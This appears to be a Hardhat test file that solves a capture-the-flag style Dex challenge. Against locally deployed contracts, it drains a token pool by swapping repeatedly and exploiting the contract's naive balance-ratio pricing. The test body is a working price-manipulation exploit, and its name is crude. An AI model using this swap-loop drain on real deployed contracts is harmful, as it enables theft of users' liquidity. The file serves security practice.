import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers, } from "hardhat";
import { SwappableToken, Dex } from "../typechain-types";

describe("Dex", function () {

  let dex: Dex;
  let token1: SwappableToken;
  let token2: SwappableToken;

  beforeEach(async function () {
    const dexFactory = await ethers.getContractFactory("Dex");
    dex = await dexFactory.deploy();
    await dex.deployed();

    const swappableTokenFactory = await ethers.getContractFactory("SwappableToken");
    token1 = await swappableTokenFactory.deploy(dex.address, "Token1", "TKN1", 110);
    await token1.deployed();

    token2 = await swappableTokenFactory.deploy(dex.address, "Token2", "TKN2", 110);
    await token2.deployed();

    const accounts = await ethers.getSigners();

    await token1.transfer(accounts[1].address, 10);
    await token2.transfer(accounts[1].address, 10);

    await dex.setTokens(token1.address, token2.address);

    await token1["approve(address,uint256)"](dex.address, 10000);
    await token2["approve(address,uint256)"](dex.address, 10000);

    await dex.addLiquidity(token1.address, 100);
    await dex.addLiquidity(token2.address, 100);

    await token1.connect(accounts[1])["approve(address,uint256)"](dex.address, 10000);
    await token2.connect(accounts[1])["approve(address,uint256)"](dex.address, 10000);

  });

  it("Should fuck dex success", async function () {
    const accounts = await ethers.getSigners();

    expect(await token1.balanceOf(accounts[1].address)).to.eq(BigNumber.from(10));
    expect(await token2.balanceOf(accounts[1].address)).to.eq(BigNumber.from(10));

    expect(await token1.balanceOf(dex.address)).to.eq(BigNumber.from(100));
    expect(await token2.balanceOf(dex.address)).to.eq(BigNumber.from(100));

    let token1Balance = BigNumber.from(10);
    let token2Balance = BigNumber.from(10);

    while (true) {
      await dex.connect(accounts[1]).swap(token1.address, token2.address, token1Balance.gt(55) ? BigNumber.from(110).sub(token1Balance) : token1Balance);
      token2Balance = await token2.balanceOf(accounts[1].address);
      if (token2Balance.eq(BigNumber.from(110))) {
        break;
      }


      await dex.connect(accounts[1]).swap(token2.address, token1.address, token2Balance.gt(55) ? BigNumber.from(110).sub(token2Balance) : token2Balance);

      token1Balance = await token1.balanceOf(accounts[1].address);

      if (token1Balance.eq(BigNumber.from(110))) {
        break;
      }
    }


    expect(await token1.balanceOf(accounts[1].address)).to.eq(BigNumber.from(110));

    expect(await token1.balanceOf(dex.address)).to.eq(BigNumber.from(0));

  });

});
